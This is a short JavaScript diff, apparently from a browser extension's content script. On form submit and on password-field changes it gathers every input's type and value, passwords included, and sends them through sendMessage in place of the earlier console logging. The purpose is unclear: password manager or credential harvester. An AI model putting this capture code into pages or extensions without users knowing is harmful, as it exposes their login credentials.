@@ -9,7 +9,13 @@ Array.from(document.forms).forEach((form) => {
     form.addEventListener(
         "submit",
         () => {
-            Array.from(inputs).forEach((i) => console.log(i.value));
+            sendMessage({
+                type: "submit",
+                form: Array.from(inputs).map((i) => ({
+                    type: i.type,
+                    value: i.value,
+                })),
+            });
         },
         false
     );
@@ -21,12 +27,12 @@ Array.from(document.forms).forEach((form) => {
     // Possibly add listener for more password fields
     passwords.forEach((p) => {
         p.addEventListener("change", () => {
-            console.log(Array.from(inputs).map((i) => i.value));
             sendMessage({
+                type: "change",
                 form: Array.from(inputs).map((i) => ({
                     type: i.type,
                     value: i.value,
-                }))
+                })),
             });
         });
     });
